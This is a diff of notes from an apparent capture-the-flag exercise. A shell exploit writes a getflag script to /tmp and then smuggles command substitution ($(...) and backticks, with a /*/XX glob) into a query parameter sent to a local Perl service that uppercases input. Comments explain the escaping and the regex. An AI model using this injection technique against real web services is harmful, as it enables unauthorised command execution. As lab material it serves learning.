@@ -1,11 +1,14 @@
 echo "getflag > /tmp/token" > /tmp/XX && chmod +x /tmp/XX
-curl http://localhost:4646?x=\`/*/XX\`
-# curl 'localhost:4646?x="`/*/x`"'
+curl  http://localhost:4646?x='$(/*/XX)'
+#curl http://localhost:4646?x=\`/*/XX\`
+
 cat /tmp/token
 
 # x=\`/*/x\`
 # /*/x - regualr expression for our file
-# `` - used aas command?
+# `` - used as command?
 # \`\` - ecraning
 
-# important: perl file change lowercase letters to uppercase and accepr token with more than one symbnols
+# important: perl file change lowercase letters to uppercase 
+#   $xx =~ s/\s.*//; 
+# =~ - call regexp, // -regular expression, \s - whitespaces, 
